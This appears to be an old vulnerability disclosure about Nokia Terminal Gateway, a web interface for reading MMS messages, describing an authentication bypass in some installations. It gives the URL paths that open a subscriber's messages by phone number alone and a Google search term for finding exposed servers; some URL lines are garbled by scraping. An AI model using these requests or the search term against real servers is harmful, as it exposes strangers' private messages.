	vulnerability

Nokia Terminal Gateway (TGW) is a server application used to deliver
multimedia messages to users with GSM handsets that do not support MMS.
Nokia Terminal Gateway is used by about 90 GSM operators all over the world.
 
When somebody sends you a multimedia message and it is not delivered to
your handset withing 15 minutes or so, the message is forwarded to a
terminal gateway. Than you receive SMS with username and password. You
can read your MMS online using Nokia Terminal Gateway web interface.
Of course you have to type in these username and password. Also you can
create your online album and send multimedia messages from TGW.
 
The most interesting part is that in some TGW installations you do not 
need username and password to access MMS.
 
Just type in the following and read the message delivered to subscriber
with phone number <MSISDN>:
//webnonsubscriber/nonsubscribermsisdnlogin.do?msisdn=http://<TGW_SERVER>/<LANG>/webnonsubscriber/nonsubscribermsisdnlogin.do?msisdn=<MSISDN>
 
Alternatively you can go to the following URL and type in the phone number:
//webnonsubscriber/msisdnlogin.jsp">http://<TGW_SERVER>/<LANG>/webnonsubscriber/msisdnlogin.jsp
In most cases <LANG> can be "en" for English.
To find a working <TGW_SERVER> you can search for "webnonsubscriber" in Google :-)
